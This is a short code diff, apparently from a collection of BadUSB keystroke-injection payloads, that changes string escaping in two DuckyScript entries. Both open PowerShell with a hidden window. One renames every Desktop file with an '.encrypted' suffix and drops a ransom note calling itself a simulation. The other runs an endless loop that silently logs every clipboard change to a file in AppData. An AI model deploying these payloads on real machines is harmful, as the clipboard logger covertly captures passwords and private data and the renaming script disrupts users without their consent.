@@ -1778,7 +1778,7 @@ DELAY 500
 STRING powershell -WindowStyle Hidden
 ENTER
 DELAY 1000
-STRING $desktop = [Environment]::GetFolderPath("Desktop"); Get-ChildItem $desktop -File | Where-Object { $_.Extension -ne ".encrypted" } | ForEach-Object { Rename-Item $_.FullName "$($_.FullName).encrypted" }; $note = "YOUR FILES HAVE BEEN ENCRYPTED (not really - this is a simulation)`nTo restore: remove the .encrypted extension from each file`nThis was a security awareness demonstration."; $note | Out-File "$desktop\\RANSOM_NOTE.txt"; Start-Process notepad "$desktop\\RANSOM_NOTE.txt"
+STRING $desktop = [Environment]::GetFolderPath("Desktop"); Get-ChildItem $desktop -File | Where-Object { $_.Extension -ne ".encrypted" } | ForEach-Object { Rename-Item $_.FullName "$($_.FullName).encrypted" }; $note = "YOUR FILES HAVE BEEN ENCRYPTED (not really - this is a simulation)\`nTo restore: remove the .encrypted extension from each file\`nThis was a security awareness demonstration."; $note | Out-File "$desktop\\RANSOM_NOTE.txt"; Start-Process notepad "$desktop\\RANSOM_NOTE.txt"
 ENTER
 DELAY 2000
 STRING exit
@@ -1850,7 +1850,7 @@ DELAY 500
 STRING powershell -WindowStyle Hidden
 ENTER
 DELAY 1000
-STRING $logFile = "$env:APPDATA\\cliplog.txt"; $last = ""; while($true){ $current = Get-Clipboard -Raw -ErrorAction SilentlyContinue; if($current -and $current -ne $last){ $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; "$ts`n$current`n---" | Out-File $logFile -Append; $last = $current }; Start-Sleep -Seconds 2 }
+STRING $logFile = "$env:APPDATA\\cliplog.txt"; $last = ""; while($true){ $current = Get-Clipboard -Raw -ErrorAction SilentlyContinue; if($current -and $current -ne $last){ $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"; "$ts\`n$current\`n---" | Out-File $logFile -Append; $last = $current }; Start-Sleep -Seconds 2 }
 ENTER`,
     notes: 'Runs continuously logging clipboard changes. Kill powershell process to stop.'
   },
